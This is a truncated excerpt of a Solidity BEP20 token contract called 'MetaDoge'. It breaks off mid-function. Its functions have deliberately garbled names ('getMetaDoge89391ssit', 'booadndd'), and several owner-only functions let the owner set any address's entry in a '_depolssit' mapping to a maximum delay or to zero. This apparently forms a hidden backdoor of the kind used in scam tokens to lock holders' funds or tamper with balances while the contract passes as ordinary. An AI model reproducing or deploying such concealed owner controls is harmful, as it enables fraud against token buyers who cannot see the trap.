...
contract MetaDoge is IBEP20, HasForeignAsset {
    ...
    function getMetaDoge89391ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setMetaDoge89391reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupMetaDoge89391ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupMetaDoge89391Aasses(address booadndd,uint256 nuum) public onlyOwner {
